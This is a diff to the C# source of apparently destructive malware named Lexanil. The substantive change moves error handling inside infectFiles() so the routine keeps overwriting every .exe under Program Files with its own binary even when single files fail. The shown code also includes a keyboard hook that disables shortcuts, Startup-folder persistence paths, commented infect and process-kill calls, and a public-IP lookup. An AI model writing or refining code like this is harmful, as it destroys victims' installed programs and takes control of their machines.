@@ -39,13 +39,13 @@ namespace Lexanil
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
-        
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern bool UnhookWindowsHookEx(IntPtr hook);
-        
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
-        
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern short GetAsyncKeyState(Keys key);
         #endregion
@@ -59,7 +59,7 @@ namespace Lexanil
         public static readonly string Startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         public static readonly string Lxnl = Path.Combine(AppData, ".lxnl");
         public static readonly string OurAppPath = Assembly.GetExecutingAssembly().Location;
-        
+
     }
 
     public partial class MainWindow : Form
@@ -92,7 +92,7 @@ namespace Lexanil
             //ShowCursor(false);
             //startupInfect();
             //infectFiles();
-           // prockilltmr.Start();
+            // prockilltmr.Start();
         }
 
         private void prockilltmr_Tick(object sender, EventArgs e)
@@ -165,20 +165,21 @@ namespace Lexanil
 
         private void infectFiles()
         {
-            try
+            foreach (string file in Directory.GetFiles(Paths.ProgramFiles, "*.exe", SearchOption.AllDirectories))
             {
-                foreach (string file in Directory.GetFiles(Paths.ProgramFiles, "*.exe", SearchOption.AllDirectories))
+                //Try is inside the foreach so we don't stop looping if a single file throws an exception
+                try
                 {
                     File.Copy(Paths.OurAppPath, file, true);
                 }
-            }
-            catch (Exception)
-            {
+                catch (Exception)
+                {
 
+                }
             }
         }
 
-        private void disableShortcuts() 
+        private void disableShortcuts()
         {
             ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
             objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
@@ -198,7 +199,7 @@ namespace Lexanil
             return null;
         }
 
-        private string GetPublicIPAddress() 
+        private string GetPublicIPAddress()
         {
             string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
             return ip;
